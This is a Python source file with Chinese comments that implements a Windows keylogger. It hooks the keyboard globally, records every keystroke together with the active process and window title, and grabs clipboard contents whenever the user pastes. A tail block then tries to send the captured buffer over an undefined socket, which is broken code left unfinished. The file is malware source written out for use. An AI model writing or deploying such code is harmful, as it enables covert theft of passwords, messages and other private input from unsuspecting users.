#coding=utf-8

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32          = windll.user32
kernel32        = windll.kernel32
psapi           = windll.psapi
current_window = None

def get_current_process():
    #获取前台窗口句柄
    hwnd = user32.GetForegroundWindow()
    
    #获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    
    #保存当前的进程
    process_id = "%d" % pid.value
    
    #申请内存
    executable = create_string_buffer(512)
    #打开进程
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    #获取窗标题
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    #读取窗口标题
    window_title = create_string_buffer(512)
    lenth = user32.GetWindowTextA(hwnd, byref(window_title),512)
    #输出进程相关信息
    print
    print("[PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
    print
    
def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    #检测按键是否为常用按键
    if event.Ascii > 32 and event.Ascii < 127:
        buffer = chr(event.Ascii)
        print(buffer)
    else:
        #如果是输入为[Ctrl - V]，则获得剪切板的内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            buffer = pasted_value
            print("[PASTE] - %s" % buffer)
        else:
            buffer = event.Key
            print("%s" % event.Key)
    #返回直到下一个钩子事件触发
    return True
#创建和注册钩子函数管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
#注册侧键盘记录的钩子，然后永久执行
kl.HookKeyboard()
pythoncom.PumpMessages()
if len(buffer):
    try:
        while True:
            print(buffer)
            client.send(buffer)
    except:
        print("[*] Exception! Exiting.")
        client.close()